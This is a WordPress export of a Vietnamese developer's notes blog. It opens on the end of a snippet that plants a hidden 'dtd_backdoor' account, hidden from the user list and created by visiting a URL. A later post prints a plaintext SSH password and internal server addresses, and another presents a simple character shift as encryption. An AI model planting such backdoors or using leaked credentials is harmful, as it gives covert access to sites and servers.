            "WHERE 1=1 AND {$wpdb->users}.user_login != 'dtd_backdoor'",
            $user_search->query_where
        );
    }
}
</pre>
Giờ chỉ cần vào link: https://duycode.com/?go=backdoor ==> đã tạo được tài khoản dtd_backdoor rồi

<h2>3. Quản lý số lần login</h2>
<pre>
<?php

if (!class_exists('Login_Manager')) {
    class Login_Manager {
        var $failed_login_limit = 3;                    // Số lần login thất bại
        var $lockout_duration   = 60 * 30;              // Thòi gian cấm login tính theo giây.
        var $transient_name     = 'attempted_login';    // Tên lưu cache

        public function __construct() {
            add_filter('authenticate', array($this, 'check_attempted_login'), 30, 3);
            add_action('wp_login_failed', array($this, 'login_failed'), 10, 1);
        }

        public function check_attempted_login($user, $username, $password) {
            if (get_transient($this->transient_name)) {
                $datas = get_transient($this->transient_name);

                // Lỗi nếu số lần thất bại lớn hơn số lần đã quy định 
                if ($datas['tried'] >= $this->failed_login_limit) {
                    $until = get_option('_transient_timeout_' . $this->transient_name);
                    $time = $this->when($until);
                    return new WP_Error('too_many_tried', sprintf(__('<strong>Error</strong>: Too many failed login attempts. Please try again in %1$s.'), $time));
                }
            }
            return $user;
        }


        public function login_failed($username) {
            // Bật lại đoạn sau nếu cần reset lại cache
            // set_transient($this->transient_name, ['tried' => 1], $this->lockout_duration);

            if (get_transient($this->transient_name)) {
                $datas = get_transient($this->transient_name);

                // Nếu số lần thất bại chưa đủ sẽ được cập nhật
                if ($datas['tried'] < $this->failed_login_limit) {
                    $datas['tried']++;
                    set_transient($this->transient_name, $datas, $this->lockout_duration);
                }
            } else {
                set_transient($this->transient_name, ['tried' => 1], $this->lockout_duration);
            }
        }

        /**
         * Return difference between 2 given dates
         * @param  int      $time   Date as Unix timestamp
         * @return string           Return string
         */
        private function when($time) {
            if (!$time)
                return;
            $diff = abs(time() - $time);
            $second = 1;
            $minute = $second * 60;
            $hour = $minute * 60;
            $day = $hour * 24;
            if ($diff < $minute)
                return $diff . ' seconds';
            if ($diff < $hour)
                return ceil($diff / $minute) . ' minutes';
            if ($diff < $day)
                return ceil($diff / $hour) . ' hours';
            return ceil($diff / $day) . ' days';
        }
    }
}

new Login_Manager();

</pre>


<h2>*. Một số vấn đề khác</h2>
<pre>
// Show $_SERVER
highlight_string("<?php\n\$data =\n" . var_export($_SERVER, true) . ";\n?>");
</pre>
]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1954</wp:post_id>
		<wp:post_date><![CDATA[2021-12-12 10:56:37]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-12-12 10:56:37]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-07-31 10:37:26]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-07-31 10:37:26]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[wordpress-mot-so-van-de]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="wordpress"><![CDATA[Wordpress]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[Kafka cơ bản]]></title>
		<link>https://duycode.com/2022/01/07/kafka-co-ban/</link>
		<pubDate>Fri, 07 Jan 2022 03:53:48 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=2000</guid>
		<description></description>
		<content:encoded><![CDATA[<a href="https://kafka.apache.org/quickstart" rel="noopener" target="_blank">https://kafka.apache.org/quickstart</a>
<h2>1. Config Kafka and Zookeeper</h2>
- Vào ./config
- Sửa zookeeper.properties
<blockquote>dataDir=C:/Apps/kafka_2.12-2.8.0/logs/zookeeper</blockquote>
- Sửa server.properties
<blockquote>
listeners=PLAINTEXT://localhost:9092
###
log.dirs=C:/Apps/kafka_2.12-2.8.0/logs/kafka-logs
</blockquote>

<h2>2. Run Server</h2>
1. Start zookeeper
<blockquote>
bin\windows\zookeeper-server-start.bat config\zookeeper.properties
</blockquote>
-- Có thể lưu lại file zookeeper-run.bat để chạy cho nhanh
<pre>
title Zookeeper Server Running ...
rmdir C:\Apps\kafka_2.12-2.8.0\logs /S /Q
echo Remove logs done!.
cd C:\Apps\kafka_2.12-2.8.0
.\bin\windows\zookeeper-server-start.bat .\config\zookeeper.properties
pause
</pre>

2. Start kafka-server
<blockquote>
bin\windows\kafka-server-start.bat config\server.properties
</blockquote>
-- Có thể lưu lại file kafka-run.bat để chạy cho nhanh
<pre>
title Kafka Server Running ...
cd C:\Apps\kafka_2.12-2.8.0
.\bin\windows\kafka-server-start.bat .\config\server.properties
pause
</pre>

3. Show all topics in Zookeeper 
<blockquote>
bin\windows\kafka-topics.bat --list --zookeeper localhost:2181
</blockquote>

-- Có thể lưu lại file list-topics-kafka.bat để chạy cho nhanh
<pre>
title List Topic Kafka
cd C:\Apps\kafka_2.12-2.8.0
cmd /k bin\windows\kafka-topics.bat --list --zookeeper localhost:2181
</pre>

4. Producer send message to topic: "alarm-unique"
<blockquote>
bin\windows\kafka-console-producer.bat --topic alarm-unique --bootstrap-server localhost:9092
</blockquote>
-- Có thể lưu lại file producer-send-message.bat để chạy cho nhanh
<pre>
title Producer Send Message
set /p topic="Enter Topic: "
cd C:\Apps\kafka_2.12-2.8.0
bin\windows\kafka-console-producer.bat --topic %topic% --bootstrap-server localhost:9092
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>2000</wp:post_id>
		<wp:post_date><![CDATA[2022-01-07 03:53:48]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-01-07 03:53:48]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-01-17 02:18:57]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-01-17 02:18:57]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[kafka-co-ban]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="docker"><![CDATA[Docker]]></category>
						</item>
					<item>
		<title><![CDATA[Một số công thức cần biết]]></title>
		<link>https://duycode.com/2022/01/10/mot-so-cong-thuc-can-biet/</link>
		<pubDate>Mon, 10 Jan 2022 02:11:53 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=2002</guid>
		<description></description>
		<content:encoded><![CDATA[<h3>1. Covariance - Hiệp phương sai</h3>
<blockquote>Cov (x, y) = SUM [(xi - xm) * (yi - ym)] / (n - 1)

xi = một giá trị x đã cho trong tập dữ liệu

xm = giá trị trung bình hoặc trung bình của các giá trị x

yi = giá trị y trong tập dữ liệu tương ứng với xi

ym = giá trị trung bình hoặc trung bình của các giá trị y

n = số điểm dữ liệu
</blockquote>

Ví dụ:
<table>
<tbody>
<tr>
<td>x</td>
<td>2</td>
<td>3</td>
<td>2.7</td>
<td>3.2</td>
<td>4.1</td>
</tr>
<tr>
<td>y</td>
<td>10</td>
<td>14</td>
<td>12</td>
<td>15</td>
<td>20</td>
</tr>
<tr>
<td>xm</td>
<td colspan="5">= (2 + 3 + 2.7 + 3.2 + 4.1) / 5 = 15 / 5 = 3</td>
</tr>
<tr>
<td>ym</td>
<td colspan="5">= (10 + 14 + 12 + 15 + 20) / 5 = 71 / 5 = 14.2</td>
</tr>
<tr>
<td>Cov(x,y)</td>
<td colspan="5">= ((2 - xm) x (10 - ym) + (3 - xm) x (14 - ym) + (2.7 - xm) x (12 - ym) +(3.2 - xm) x (15 - ym) + (4.1 - xm) x (20 - ym)) / (5 - 1)<br />= (4.2 + 0 + 0,66 + 0,16 + 6,38) / 4 <br />= 2,85</td>
</tr>
</tbody>
</table>



]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>2002</wp:post_id>
		<wp:post_date><![CDATA[2022-01-10 02:11:53]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-01-10 02:11:53]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-01-10 02:15:43]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-01-10 02:15:43]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[mot-so-cong-thuc-can-biet]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="chung-khoan"><![CDATA[Chứng Khoán]]></category>
						</item>
					<item>
		<title><![CDATA[Check Log FTL]]></title>
		<link>https://duycode.com/2022/01/11/check-log-ftl/</link>
		<pubDate>Tue, 11 Jan 2022 09:06:13 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=2014</guid>
		<description></description>
		<content:encoded><![CDATA[<h2> 1. Cài đặt</h2>
1. Cài WSL từ Windows store
2. Cài Ubuntu
3. Dùng PowerSell

<h2>2. SSH vào server</h2>
- Bật WSL bằng lệnh: wsl
- Dùng ssh connect vào host: 192.168.100.4, với user = apsc, và password = Anw311CT
sshpass -p "Anw311CT" ssh -o StrictHostKeyChecking=no apsc@192.168.100.4

- Hoặc dùng ssh connect vào host: 10.0.46.12, với user = ubuntu, và key là file: ftl_mas.pem
sudo ssh -i /mnt/d/FTLVN/SSH/ftl_key/ftl_mas.pem  -o StrictHostKeyChecking=no ubuntu@10.0.46.12

- Sau bước này, các thao tác trên powerShell là thao tác với server

<h2>3. Các bước check logs</h2>
--- Check các con server đang chạy
docker ps -a

--- Check 100 lỗi (-f : là real time)
utils/logs.sh alarm 100 -f | grep 'text-search'

-- Show các file hiện có
ls
ls -la

-- cd vào folder chứa file ghi lỗi
cd container/logs/alarm

<h2>4. Tìm kiếm: grep, zgrep </h2>
<pre>
$grep -rn 'text-search' | grep -rn 'text-search-2' .
r: (recursive: đệ quy) - tìm kiếm cả thư mục con
n: hiển thị số dòng

$zgrep -n --color=always 'Dog\|Cat' *.gz
// *.gz : giải nén tất cả file .gz
// \| : điều kiện "OR"

$zgrep -n -a --color=always 'Dog' *.gz | grep 'Cat'
// Không có điều kiện "AND" -> dùng 2 câu lệnh liên tiếp thay thế
</pre>
grep, zgrep]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>2014</wp:post_id>
		<wp:post_date><![CDATA[2022-01-11 09:06:13]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-01-11 09:06:13]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-05-16 09:39:20]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-05-16 02:39:20]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[check-log-ftl]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="docker"><![CDATA[Docker]]></category>
						</item>
					<item>
		<title><![CDATA[MySQL - Cài đặt]]></title>
		<link>https://duycode.com/2022/02/07/mysql-cai-dat/</link>
		<pubDate>Mon, 07 Feb 2022 06:36:46 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=2026</guid>
		<description></description>
		<content:encoded><![CDATA[1. Download XAMPP
2. Start Apache và Start MySQL
3. Dùng Shell
<pre>
// với username: root, password: _
# mysql -u root -p
> SHOW DATABASES;
</pre>

4. Tiếp tục dùng Shell tạo 1 databases
<pre>
DROP DATABASE test_db;
CREATE DATABASE IF NOT EXISTS test_db DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci;
USE test_db;

DROP TABLE IF EXISTS `Categories`;
CREATE TABLE `Categories` (
                              `categoryID` varchar(10) NOT NULL,
                              `categoryName` varchar(100) DEFAULT NULL,
                              `description` varchar(200) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

INSERT INTO `Categories` (`categoryID`, `categoryName`, `description`) VALUES
                                                                           ('C0101', 'Beverages', 'Soft drinks, coffees, teas, beers, and ales'),
                                                                           ('C0102', 'Condiments', 'Sweet and savory sauces, relishes, spreads, and seasonings'),
                                                                           ('C0103', 'Confections', 'Desserts, candies, and sweet breads'),
                                                                           ('C0104', 'Dairy Products', 'Cheeses'),
                                                                           ('C0105', 'Grains_Cereals', 'Breads, crackers, pasta, and cereal'),
                                                                           ('C0106', 'Meat_Poultry', 'Prepared meats'),
                                                                           ('C0107', 'Produce', 'Dried fruit and bean curd'),
                                                                           ('C0108', 'Seafood', 'Seaweed and fish');

DROP TABLE IF EXISTS `Products`;
CREATE TABLE `Products` (
                            `productID` varchar(10) NOT NULL,
                            `categoryID` varchar(10) DEFAULT NULL,
                            `productName` varchar(50) DEFAULT NULL,
                            `price` int(11) DEFAULT NULL,
                            `description` varchar(200) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;


INSERT INTO `Products` (`productID`, `categoryID`, `productName`, `price`, `description`) VALUES
                                                                                              ('P0101', 'C0101', 'Chai', 18, 'Good product'),
                                                                                              ('P01010', 'C0104', 'Ikura', 31, 'Good'),
                                                                                              ('P01011', 'C0105', 'Queso Cabrales', 21, 'Good'),
                                                                                              ('P01012', 'C0105', 'Queso Manchego La Pastora', 38, 'Good'),
                                                                                              ('P0102', 'C0101', 'Chang', 19, 'best sell product'),
                                                                                              ('P0103', 'C0101', 'Aniseed Syrup', 10, 'new produced'),
                                                                                              ('P0104', 'C0102', 'Chef Anton\'s Cajun Seasoning', 22, 'popular product'),
('P0105', 'C0102', 'Chef Anton\'s Gumbo Mix', 21, 'Good For life'),
                                                                                              ('P0106', 'C0103', 'Grandma\'s Boysenberry Spread', 25, 'Good'),
('P0107', 'C0103', 'Uncle Bob\'s Organic Dried Pears', 30, 'Good'),
                                                                                              ('P0108', 'C0103', 'Northwoods Cranberry Sauce', 40, 'Good'),
                                                                                              ('P0109', 'C0104', 'Mishi Kobe Niku', 97, 'Good');

ALTER TABLE `Categories` ADD PRIMARY KEY (`categoryID`);

ALTER TABLE `Products` ADD PRIMARY KEY (`productID`);
COMMIT;
</pre>

5. Tiếp tục dùng Shell kiểm tra databases
<pre>
SHOW TABLES;
SELECT * FROM Categories;
SELECT * FROM Products;
DESCRIBE Categories;
DESCRIBE Products;
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>2026</wp:post_id>
		<wp:post_date><![CDATA[2022-02-07 06:36:46]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-02-07 06:36:46]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-02-07 07:14:10]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-02-07 07:14:10]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[mysql-cai-dat]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="sql"><![CDATA[SQL]]></category>
						</item>
					<item>
		<title><![CDATA[Socket cơ bản]]></title>
		<link>https://duycode.com/2022/02/14/socket-co-ban/</link>
		<pubDate>Mon, 14 Feb 2022 02:48:50 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=2032</guid>
		<description></description>
		<content:encoded><![CDATA[<pre>
//Code socket io
const server = require('http').Server(app);
const io = require('socket.io')(server);
server.listen(port, () => {
	console.log('Domain listening at http://localhost:' + port);
});
io.on('connection', function (socket) {
	console.log('Co nguoi ket noi: ' + socket.id);

	socket.join('Nodejs');
	console.log(socket.adapter.rooms);

	socket.on('disconnect', function () {
		console.log(socket.id + ': ngat ket noi !!!');
	});

	socket.on('Client-Send-Data', function (data) {
		console.log(socket.id + ' vua gui: ' + data);
		//TH1: Gửi tất cả các client
		io.sockets.emit('Server-send-data', data + '888');
		//TH2: Gửi lại chính client
		//socket.emit('Server-send-data', data + '888');
		//TH3: Gửi tất cả các client trừ chính client gửi
		//socket.broadcast.emit('Server-send-data', data + '888');
		//TH4: Gửi tất cả các client trong 1 room nhất định, ví dụ rooms "NODEJS"
		io.sockets.in('NODEJS').emit('Server-Send-Data', data + '888');
	});

	socket.on('Join-Room', function (data) {
		//Kiểm tra xem có room chưa, nếu chưa có thì tạo room, có rồi thì join
		socket.join(data);
	});
	socket.on('Leave-Room', function (data) {
		//Thoát room, nếu room còn 0 socket sẽ tự động xóa room
		socket.leave(data);
	});
});
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>2032</wp:post_id>
		<wp:post_date><![CDATA[2022-02-14 02:48:50]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-02-14 02:48:50]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-02-14 02:48:50]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-02-14 02:48:50]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[socket-co-ban]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="docker"><![CDATA[Docker]]></category>
						</item>
					<item>
		<title><![CDATA[NodeJS configs: P1. Cài đặt Typescript]]></title>
		<link>https://duycode.com/2022/02/20/su-dung-prettier-va-eslint-co-ban/</link>
		<pubDate>Sun, 20 Feb 2022 01:00:16 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=2036</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. Cài đặt thư viện</h2>
<blockquote>
npm i -D typescript ts-node @types/node
</blockquote>

<h2>2. Tạo file tsconfig.json</h2>
<blockquote>
npx tsc --init
</blockquote>
-- Sử file tsconfig.json như sau
<pre>
{
    "compilerOptions": {
        /* Language and Environment */
        "target": "es6",                                     /* Option: "es3", "es5", "es6", "esnext" ==> Sử dụng phiên bản javascript sau khi được transpiler*/
        "lib": [ "es6" ],                                    /* Specify a set of bundled library declaration files that describe the target runtime environment. */

        "experimentalDecorators": true,                      /* Sử dụng Decorator trong Typescript */
        "emitDecoratorMetadata": true,                       /* Sử dụng Decorator trong Typescript. */
        
        /* Modules */
        "module": "commonjs",                                /* Option: "commonjs", "amd", "umd", "system", "esnext", "es6", "es2020" */
        // "rootDir": "./",                                  /* Specify the root folder within your source files. */
        "moduleResolution": "node",                          /* Cũng chưa rõ là gì. */
  
        /* ====== Emit ====== */
        "sourceMap": false,                                  /* Create source map files for emitted JavaScript files. */
        "outDir": "./dist",                                  /* Vị trí thư mục sau khi được transpiler */
        "removeComments": true,                              /* Xóa comment khi transpiler ra javascript. */
        "newLine": "lf",                                     /* Option: "crlf", "lf" */

        /* ====== Interop Constraints ====== */
        "esModuleInterop": true,                             /* Chưa rõ lắm :((

        /* ====== Completeness ====== */
        // "strict": true,                                   /* Nếu chọn "true" ==> bật tất cả các quy định ở dưới lên. */
    },
    "include": [
        "src/**/*"
    ],
    "exclude": [
        "node_modules"
    ]
}
</pre>

<h2>3. Tạo thêm command trong package.json</h2>
<blockquote>
"scripts": {
    "tsc-watch": "tsc --watch --project tsconfig.json",
    "dev-test": "nodemon --watch src src/test.ts",
},
</blockquote>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>2036</wp:post_id>
		<wp:post_date><![CDATA[2022-02-20 01:00:16]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-02-20 01:00:16]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-02-26 03:53:11]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-02-26 03:53:11]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[su-dung-prettier-va-eslint-co-ban]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="nodejs"><![CDATA[NodeJS]]></category>
						</item>
					<item>
		<title><![CDATA[NodeJS configs: P2. Cài đặt Eslint và Prettier]]></title>
		<link>https://duycode.com/2022/02/20/nodejs-configs-p2-cai-dat-eslint-va-prettier/</link>
		<pubDate>Sun, 20 Feb 2022 02:00:37 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=2050</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>I. Cài đặt thư viện</h2>
<pre>
npm i -D prettier eslint

// Thư viện để kết hợp prettier với eslint
npm i -D eslint-config-prettier eslint-plugin-prettier

// Thư viện để eslint nhận dạng typescript
npm i -D @typescript-eslint/eslint-plugin @typescript-eslint/parser eslint-plugin-import

// Thư viện để sử dụng cú pháp chuẩn của bnb
npm i -D eslint-config-airbnb-typescript
</pre>

<h2>II. Config Prettier</h2>
- Tạo file config tại thư mục gốc: /.prettierrc.js hoặc: /prettier.config.js
<pre>
module.exports = {
    useTabs: false,                         // sử dụng tab đầu dòng
    tabWidth: 4,                            // chiều rộng tab
    endOfLine: 'lf',
    semi: false,                            // dấu ; cuối dòng
    trailingComma: 'all',                   // điền dấu , ở item cuối cùng của object
    bracketSpacing: true,                   // khoảng trắng { a } thay vì {a}
    singleQuote: true,                      // dấu nháy '' thay vì ""
    printWidth: 100,                        // chiều dài 1 dòng: 120
    arrowParens: 'avoid',                   // arrowfunction dạng: a => {} thay vì (a)=>{}
    htmlWhitespaceSensitivity: "ignore",    // <a></a> không cho xuống dòng ngu ngu dạng <a></a  \n >
    quoteProps: "as-needed",                // Bỏ dấu ngoặc đơn ở key của Object
}
</pre>

<h2>II. Config ESlint </h2>
<h3>1. Tạo file config tại thư mục gốc: /.eslintrc.js</h3>
<pre>
module.exports = {
	root: true,
	parser: '@typescript-eslint/parser',
	extends: [
		'eslint:recommended',
		'plugin:@typescript-eslint/recommended',
		'airbnb-base',
		'airbnb-typescript/base',
		'prettier',
	],
	plugins: ['@typescript-eslint', 'prettier'],
	parserOptions: {
		project: ['./tsconfig.json'],
	},
	rules: {
		'prettier/prettier': ['error'],
		'no-unused-vars': 0, // khai báo biến mà không sử dụng sẽ lỗi
		'@typescript-eslint/no-unused-vars': 0,
		'@typescript-eslint/no-explicit-any': 0, // không cho dùng type any
		'no-console': 0,
		'no-useless-concat': 0, // Bắt buộc viết 1 chuỗi, ko để dạng cộng 2 chuỗi, vcc
		'prefer-template': 0, // Bắt buộc dùng template string khi cộng chuỗi, vcc
		'import/prefer-default-export': 0, // Nếu export 1 biến thì mặc định phải là default, vcc
	},
}

</pre>

<h3>2. Tạo file ignore tại thư mục gốc: /.eslintignore </h3>
<pre>
node_modules
dist
</pre>


]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>2050</wp:post_id>
		<wp:post_date><![CDATA[2022-02-20 02:00:37]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-02-20 02:00:37]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-02-26 04:03:07]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-02-26 04:03:07]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[nodejs-configs-p2-cai-dat-eslint-va-prettier]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="nodejs"><![CDATA[NodeJS]]></category>
						</item>
					<item>
		<title><![CDATA[Encrypt và Decrypt siêu đơn giản]]></title>
		<link>https://duycode.com/2022/03/08/encrypt-va-decrypt-sieu-don-gian/</link>
		<pubDate>Tue, 08 Mar 2022 04:19:35 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=2064</guid>
		<description></description>
		<content:encoded><![CDATA[<pre>
const stringToHex = (str, distance = 0) => {
    var arr = [];
    for (var i = 0; i < str.length; i++) {
        arr[i] = ('\\u00' + (str.charCodeAt(i) + distance).toString(16)).slice(-4);
    }
    return '\\u' + arr.join('\\u');
};

const hexToString = str => {
    return unescape(str.replace(/\\/g, '%'));
};

const rulesDistance = str => {
    let num = 0;
    for (var i = 0; i < str.length; i++) {
        num += (str.charCodeAt(i) + i) * 2;
    }
    return num;
};

const encript = (message, secretKey) => {
    const distance = rulesDistance(secretKey);
    const hex = stringToHex(message, distance);
    return hexToString(hex);
};

const decript = (token, secretKey) => {
    const distance = rulesDistance(secretKey);
    const hex = stringToHex(token, -distance);
    return hexToString(hex);
};

const text = 'hello word';

const token = encript(text, 'secret_key');
console.log(token);

const root = decript(token, 'secret_key');
console.log(root);

</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>2064</wp:post_id>
		<wp:post_date><![CDATA[2022-03-08 04:19:35]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-03-08 04:19:35]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-03-08 04:19:35]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-03-08 04:19:35]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[encrypt-va-decrypt-sieu-don-gian]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="javascript"><![CDATA[Javascript]]></category>
						</item>
					<item>
		<title><![CDATA[Câu hỏi NodeJs]]></title>
		<link>https://duycode.com/2022/03/15/cau-hoi-nodejs/</link>
		<pubDate>Tue, 15 Mar 2022 16:15:49 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=2069</guid>
		<description></description>
		<content:encoded><![CDATA[theo style phỏng vấn của mình thì tùy vào CV của bạn và yêu cầu công việc trong JD. Loanh quanh mấy cái đó + 1 số kiến thức phổ quát must have chứ không theo style đánh đố của nhiều bên. Vị trí nodejs thì chắc tuyển backend nên sẽ hỏi những thứ liên quan backend gồm thiết kế API, ngôn ngữ, database, deployment
- Nhiều chỗ sẽ bắt đầu hỏi từ REST, OOP, functional programing cho tới SOLID rồi mấy cái của lập trình nói chung. Mình thì ko hay hỏi mấy cái này lắm 😊))) 
- Kiến thức phổ thông thì 1 số kiến thức liên quan tới node như bạn hiểu thế nào về promise, async await, event loop, single thread, engine v8,... hoặc kiến thức chung như http request, session, cookie, authen,... 1 trong những thứ mình rất thích hỏi và cũng thấy nhiều chỗ hỏi chính là việc bạn có hiểu sâu về cách website/http request hoạt động không, từ đó có hiểu quá trình authen/author như thế nào không hay chỉ biết dùng lib,...
- Database thì tùy xem bạn có kiến thức về db sâu tới đâu sẽ hỏi tới đó. Càng biết sâu thì người ta càng hỏi sâu thôi không có giới hạn gì cả. Từ cách thiết kế, modeling, index, query,... Chí ít thì cũng phải biết về sql, nosql, dùng được orm hoặc query builder, tránh được sql injection,... 
